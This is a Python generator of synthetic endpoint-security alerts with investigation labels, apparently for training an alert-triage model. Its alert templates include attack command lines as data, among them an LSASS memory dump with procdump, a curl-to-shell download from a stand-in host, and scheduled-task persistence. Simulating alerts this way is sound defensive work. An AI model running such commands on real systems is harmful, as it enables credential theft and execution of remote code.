"""Synthetic, non-sensitive alert generator so the pipeline runs end-to-end without customer data.

Produces OCSF-shaped payloads (as JSON strings, like the rawData string the FE sends) plus a
binary ``needs_investigation`` label. The schema is a stand-in; the ``file.path`` key exists
only here and is NOT a validated field of the real alert schema.
"""

from __future__ import annotations

import json

import numpy as np
import pandas as pd

LABEL = "needs_investigation"  # 1 = should have been investigated, 0 = safely auto-disposable

_B64 = np.array(list("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"))

# (title, category, description, exe, directories, command template, base logit)
_TEMPLATES: list[tuple[str, str, str, str, list[str], str, float]] = [
    (
        "Suspicious PowerShell execution",
        "Execution",
        "PowerShell launched with an encoded command",
        "powershell.exe",
        [r"C:\Users\{u}\AppData\Local\Temp", r"C:\Windows\System32\WindowsPowerShell\v1.0"],
        "powershell.exe -NoProfile -EncodedCommand {b64}",
        0.2,
    ),
    (
        "Scheduled task created",
        "Persistence",
        "A scheduled task was registered by a user process",
        "schtasks.exe",
        [r"C:\Windows\System32"],
        "schtasks.exe /create /tn Updater /tr C:\\Users\\{u}\\AppData\\Roaming\\up.exe",
        -0.3,
    ),
    (
        "Unsigned binary executed from user profile",
        "Execution",
        "An unsigned executable ran from a user-writable directory",
        "update.exe",
        [r"C:\Users\{u}\AppData\Local\Temp", r"C:\Users\{u}\Downloads"],
        "update.exe /silent",
        0.4,
    ),
    (
        "Software updater network activity",
        "Command and Control",
        "A known updater contacted a remote host",
        "updater.exe",
        [r"C:\Program Files\Vendor\Updater"],
        "updater.exe --check",
        -2.0,
    ),
    (
        "Backup agent file modification burst",
        "Impact",
        "Many files were modified by a backup process",
        "backup.exe",
        [r"C:\Program Files\Backup"],
        "backup.exe --incremental",
        -2.5,
    ),
    (
        "Credential access tool pattern",
        "Credential Access",
        "A process accessed memory of a security-sensitive process",
        "procdump.exe",
        [r"C:\Users\{u}\Downloads", r"C:\Windows\Temp"],
        "procdump.exe -ma lsass.exe out.dmp",
        1.4,
    ),
    (
        "Shell spawned by web server",
        "Execution",
        "A web server process started an interactive shell",
        "bash",
        ["/usr/bin", "/tmp"],
        "bash -c 'curl http://example.test/a.sh | sh'",
        1.0,
    ),
    (
        "Package manager activity",
        "Execution",
        "A package manager ran a post-install script",
        "apt",
        ["/usr/bin"],
        "apt install -y package",
        -2.2,
    ),
]


def _alert(rng: np.random.Generator, tmpl_idx: int) -> tuple[dict[str, object], float]:
    title, category, desc, exe, dirs, cmd, logit = _TEMPLATES[tmpl_idx]
    user = f"user{rng.integers(0, 500)}"
    directory = dirs[rng.integers(0, len(dirs))].format(u=user)
    sep = "\\" if "\\" in directory else "/"
    b64 = "".join(rng.choice(_B64, 64))
    n_evidence = int(rng.poisson(1.5))
    if "temp" in directory.lower() or directory.startswith("/tmp"):
        logit += 1.2
    if "{b64}" in cmd:
        logit += 0.8
    logit += 0.25 * min(n_evidence, 6)
    payload: dict[str, object] = {
        "analytic": {"category": category, "desc": desc},
        "finding_info": {"title": title},
        "message": f"{title} on host-{rng.integers(0, 10**6)}",
        "confidence_id": int(rng.integers(1, 4)),
        "process": {
            "file": {"name": exe, "path": f"{directory}{sep}{exe}"},
            "cmd_line": cmd.format(u=user, b64=b64),
        },
        "evidences": [
            {"process": {"file": {"name": "cmd.exe"}, "cmd_line": "cmd.exe /c whoami"}}
            for _ in range(n_evidence)
        ],
        # Outcome/workflow fields are present on purpose: the pipeline must ignore them.
        "status": "resolved",
        "verdict_id": int(rng.integers(0, 3)),
    }
    return payload, logit


def make_synthetic_alerts(n: int = 5000, seed: int = 42) -> pd.DataFrame:
    """Chronologically ordered synthetic alerts with a binary investigation label."""
    rng = np.random.default_rng(seed)
    start = pd.Timestamp("2026-01-01")
    created = start + pd.to_timedelta(np.sort(rng.integers(0, 90 * 24 * 3600, n)), unit="s")
    payloads: list[str] = []
    labels = np.zeros(n, dtype=int)
    for i in range(n):
        payload, logit = _alert(rng, int(rng.integers(0, len(_TEMPLATES))))
        payloads.append(json.dumps(payload))
        labels[i] = int(rng.random() < 1 / (1 + np.exp(-logit)))
    return pd.DataFrame(
        {
            "alert_id": [f"a{i:07d}" for i in range(n)],
            "created_at": created,
            "tenant_id": rng.choice([f"tenant_{i}" for i in range(6)], n),
            "source": rng.choice(["EDR", "CWS"], n, p=[0.8, 0.2]),
            "alert": payloads,
            LABEL: labels,
        }
    )
